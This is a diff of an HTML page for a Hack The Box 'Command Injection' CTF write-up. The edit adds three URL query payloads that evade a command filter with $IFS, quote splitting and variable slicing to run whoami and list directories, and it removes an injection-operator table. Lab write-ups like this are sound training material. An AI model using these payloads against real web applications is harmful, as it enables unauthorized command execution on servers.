@@ -1,16 +1,17 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Command Injection | Robert Hollands</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <link
+    href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+    rel="stylesheet" />
 </head>
 <body class="bg-white text-gray-900">
 
-  <!-- Header/Nav -->
-  <header class="bg-gray-900 text-white px-4 py-4 shadow-md fixed w-full z-10 relative">
+  <!-- Header/Nav (same as other pages) -->
+  <header class="bg-gray-900 text-white px-4 py-4 shadow-md fixed w-full z-10">
     <div class="max-w-4xl mx-auto flex justify-between items-center">
       <div class="text-xl font-bold">
         <a href="/" class="hover:text-gray-300">Robert Hollands</a>
@@ -21,7 +22,7 @@
                 d="M4 6h16M4 12h16M4 18h16"/>
         </svg>
       </button>
-      <nav id="nav-menu" class="hidden md:flex flex-row justify-between items-center w-full bg-gray-900 md:bg-transparent px-4 md:px-0 py-4 md:py-0 absolute md:static top-full left-0">
+      <nav id="nav-menu" class="hidden md:flex space-x-4">
         <a href="/" class="hover:text-gray-300">Home</a>
         <a href="/CTF/" class="text-gray-300 font-semibold">CTFs</a>
         <a href="/#education" class="hover:text-gray-300">Education</a>
@@ -31,143 +32,118 @@
       </nav>
     </div>
     <script>
-      const btn = document.getElementById('nav-toggle');
-      const menu = document.getElementById('nav-menu');
-      btn.addEventListener('click', () => menu.classList.toggle('hidden'));
+      document.getElementById('nav-toggle')
+        .addEventListener('click', () =>
+          document.getElementById('nav-menu').classList.toggle('hidden')
+        );
     </script>
   </header>
 
-  <!-- Main Content -->
+  <!-- Main content -->
   <main class="pt-24 pb-12 px-4">
     <article class="max-w-3xl mx-auto">
 
-      <!-- Title with HTB logo -->
+      <!-- Title + HTB logo -->
       <div class="flex items-center mb-4 space-x-4">
-        <img src="/images/htb-logo.png" alt="Hack The Box logo" class="w-10 h-10">
+        <img src="/images/htb.png"
+             alt="Hack The Box logo"
+             class="w-10 h-10">
         <h1 class="text-4xl font-bold">HTB Command Injection writeup</h1>
       </div>
       <p class="text-gray-600 mb-8">August 4, 2025; 6 min read</p>
 
-      <!-- Concepts list -->
-      <p class="mb-4">This writeup features the following concepts:</p>
-      <ul class="list-disc list-inside mb-8">
-        <li>Command injection</li>
-        <li>Command injection filter bypass</li>
-        <li>Blacklisted character bypass</li>
-        <li>Command obfuscation</li>
-        <li>Space filter bypass</li>
-      </ul>
-
-      <!-- Section: Login page -->
-      <section class="mb-12">
-        <h2 class="text-2xl font-semibold mb-4">Login page and credentials</h2>
-        <p class="mb-4">We are given this login page and valid credentials guest ; guest.</p>
-        <div class="mb-8">
-          <img src="/images/CI1.png" alt="Initial login page" class="w-full rounded-lg shadow-md">
+      <!-- Prettier features section -->
+      <div class="mb-8">
+        <p class="font-semibold mb-2">Concepts covered:</p>
+        <div class="flex flex-wrap gap-2">
+          <span class="bg-gray-200 px-3 py-1 rounded-full text-sm">Command injection</span>
+          <span class="bg-gray-200 px-3 py-1 rounded-full text-sm">Filter bypass</span>
+          <span class="bg-gray-200 px-3 py-1 rounded-full text-sm">Blacklist bypass</span>
+          <span class="bg-gray-200 px-3 py-1 rounded-full text-sm">Obfuscation</span>
+          <span class="bg-gray-200 px-3 py-1 rounded-full text-sm">Space bypass</span>
         </div>
-        <div class="mb-8 grid grid-cols-1 md:grid-cols-2 gap-4">
-          <img src="/images/CI2.png" alt="Entering guest cred" class="w-full rounded-lg shadow-md">
-          <img src="/images/CI3.png" alt="Successful guest login" class="w-full rounded-lg shadow-md">
+      </div>
+
+      <!-- Step sections with images & code snippets -->
+      <section class="mb-12">
+        <h2 class="text-2xl font-semibold mb-4">Login page & credentials</h2>
+        <p class="mb-4">
+          We are given a login page with valid credentials <code>guest:guest</code>.
+        </p>
+        <img src="/images/CI1.png" alt="Login panel" class="w-full rounded-lg shadow-md mb-4">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <img src="/images/CI2.png" alt="Enter guest" class="rounded-lg shadow-md">
+          <img src="/images/CI3.png" alt="Successful login" class="rounded-lg shadow-md">
         </div>
       </section>
 
-      <!-- Section: Actions panel -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Actions allowed panel</h2>
-        <p class="mb-4">The panel shows copy to and function operations for every file.</p>
-        <div class="mb-8">
-          <img src="/images/CI4.png" alt="Actions allowed panel" class="w-full rounded-lg shadow-md">
-        </div>
+        <p class="mb-4">The panel shows <strong>copy</strong> and <strong>function</strong> operations.</p>
+        <img src="/images/CI4.png" alt="Actions panel" class="w-full rounded-lg shadow-md">
       </section>
 
-      <!-- Section: Moving files -->
       <section class="mb-12">
-        <h2 class="text-2xl font-semibold mb-4">Moving files into tmp</h2>
-        <p class="mb-4">Moving a file into <code>/var/www/html/files/tmp</code> succeeds without error.</p>
-        <div class="mb-8 grid grid-cols-1 md:grid-cols-2 gap-4">
-          <img src="/images/CI5.png" alt="Move to tmp success" class="w-full rounded-lg shadow-md">
-          <img src="/images/CI6.png" alt="No error shown" class="w-full rounded-lg shadow-md">
+        <h2 class="text-2xl font-semibold mb-4">Moving into tmp directory</h2>
+        <p class="mb-4">
+          Moving a file to <code>/var/www/html/files/tmp</code> works without error.
+        </p>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <img src="/images/CI5.png" alt="Move to tmp success" class="rounded-lg shadow-md">
+          <img src="/images/CI6.png" alt="No error shown" class="rounded-lg shadow-md">
         </div>
       </section>
 
-      <!-- Section: Blocked path -->
       <section class="mb-12">
-        <h2 class="text-2xl font-semibold mb-4">Blocked path outside tmp</h2>
-        <p class="mb-4">Moving a file behind <code>/tmp</code> triggers a malicious block error.</p>
-        <div class="mb-8 grid grid-cols-1 md:grid-cols-2 gap-4">
-          <img src="/images/CI7.png" alt="Malicious block error" class="w-full rounded-lg shadow-md">
-          <img src="/images/CI8.png" alt="Error details" class="w-full rounded-lg shadow-md">
+        <h2 class="text-2xl font-semibold mb-4">Blocked outside tmp</h2>
+        <p class="mb-4">
+          Attempting to move behind <code>/tmp</code> triggers a malicious block error.
+        </p>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <img src="/images/CI7.png" alt="Malicious block" class="rounded-lg shadow-md">
+          <img src="/images/CI8.png" alt="Error details" class="rounded-lg shadow-md">
         </div>
       </section>
 
-      <!-- Section: Intercept request -->
       <section class="mb-12">
-        <h2 class="text-2xl font-semibold mb-4">Intercepting and analyzing the request</h2>
-        <p class="mb-4">The move command is passed in the URL after <code>index.php</code>. We can inject additional commands using operators such as <code>&amp;</code>.</p>
-        <div class="mb-8">
-          <img src="/images/CI9.png" alt="Burp intercept" class="w-full rounded-lg shadow-md">
-        </div>
+        <h2 class="text-2xl font-semibold mb-4">Intercept & inject</h2>
+        <p class="mb-4">
+          The move command lives in the URL after <code>index.php</code>. We can chain commands using operators.
+        </p>
+        <img src="/images/CI9.png" alt="Burp intercept" class="w-full rounded-lg shadow-md">
       </section>
 
-      <!-- Section: Operator table -->
-      <section class="mb-12">
-        <h2 class="text-2xl font-semibold mb-4">Operator reference</h2>
-        <table class="w-full table-auto mb-8 text-sm">
-          <thead>
-            <tr class="bg-gray-200">
-              <th class="px-4 py-2 text-left">Operator</th>
-              <th class="px-4 py-2 text-left">Character</th>
-              <th class="px-4 py-2 text-left">URL-encoded</th>
-              <th class="px-4 py-2 text-left">Behavior</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr><td class="border px-4 py-2">Semicolon</td><td class="border px-4 py-2">;</td><td class="border px-4 py-2">%3b</td><td class="border px-4 py-2">both commands</td></tr>
-            <tr><td class="border px-4 py-2">New line</td><td class="border px-4 py-2">\n</td><td class="border px-4 py-2">%0a</td><td class="border px-4 py-2">both commands</td></tr>
-            <tr><td class="border px-4 py-2">Background</td><td class="border px-4 py-2">&amp;</td><td class="border px-4 py-2">%26</td><td class="border px-4 py-2">both; second output first</td></tr>
-            <tr><td class="border px-4 py-2">Pipe</td><td class="border px-4 py-2">|</td><td class="border px-4 py-2">%7c</td><td class="border px-4 py-2">only second output</td></tr>
-            <tr><td class="border px-4 py-2">AND</td><td class="border px-4 py-2">&&</td><td class="border px-4 py-2">%26%26</td><td class="border px-4 py-2">both; second if first succeeds</td></tr>
-            <tr><td class="border px-4 py-2">OR</td><td class="border px-4 py-2">||</td><td class="border px-4 py-2">%7c%7c</td><td class="border px-4 py-2">second if first fails</td></tr>
-            <tr><td class="border px-4 py-2">Sub-shell backticks</td><td class="border px-4 py-2">``</td><td class="border px-4 py-2">%60%60</td><td class="border px-4 py-2">both (Linux)</td></tr>
-            <tr><td class="border px-4 py-2">Sub-shell $()</td><td class="border px-4 py-2">$()</td><td class="border px-4 py-2">%24%28%29</td><td class="border px-4 py-2">both (Linux)</td></tr>
-          </tbody>
-        </table>
-        <div class="mb-8 grid grid-cols-1 md:grid-cols-2 gap-4">
-          <img src="/images/CI10.png" alt="Operator test ampersand" class="w-full rounded-lg shadow-md">
-          <img src="/images/CI11.png" alt="New file created" class="w-full rounded-lg shadow-md">
-        </div>
-      </section>
-
-      <!-- Section: Bypass and obfuscation -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Bypass with obfuscation</h2>
-        <p class="mb-4">The <code>whoami</code> command is blocked so we escape and use quotes and variable expansion to run it as <code>www-data</code>.</p>
-        <div class="mb-8">
-          <img src="/images/CI12.png" alt="whoami bypass" class="w-full rounded-lg shadow-md">
-        </div>
+        <!-- code sample -->
+        <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
+?to=tmp$IFS%26w'h'oa'm'i&from=78113764.txt&finish=&move=
+        </pre>
+        <p class="mb-4">This returns <code>www-data</code>.</p>
+        <img src="/images/CI12.png" alt="whoami bypass" class="w-full rounded-lg shadow-md">
       </section>
 
-      <!-- Section: Directory listing -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Listing home directory</h2>
-        <p class="mb-4">We pass <code>-a</code> to list hidden files.</p>
-        <div class="mb-8">
-          <img src="/images/CI13.png" alt="Home directory listing" class="w-full rounded-lg shadow-md">
-        </div>
+        <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
+?to=tmp$IFS%26l's'$IFS'-a'${HOME:0:1}&from=787113764.txt&finish=&move=
+        </pre>
+        <img src="/images/CI13.png" alt="Home directory listing" class="w-full rounded-lg shadow-md">
       </section>
 
-      <!-- Section: Retrieving the flag -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Retrieving the flag</h2>
-        <p class="mb-4">We swap to <code>${PATH:0:1}</code> and read the flag file.</p>
-        <div class="mb-8">
-          <img src="/images/CI14.png" alt="Flag contents" class="w-full rounded-lg shadow-md">
-        </div>
+        <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
+?to=tmp$IFS%26l's'$IFS'-a'${PATH:0:1}&from=787113764.txt&finish=&move=
+        </pre>
+        <img src="/images/CI14.png" alt="Flag contents" class="w-full rounded-lg shadow-md">
       </section>
 
       <!-- Back link -->
       <div class="mt-12">
-        <a href="/CTF/" class="text-blue-600 hover:underline">&larr; Back to all CTF writeups</a>
+        <a href="/CTF/" class="text-blue-600 hover:underline">
+          &larr; Back to all CTF writeups
+        </a>
       </div>
 
     </article>
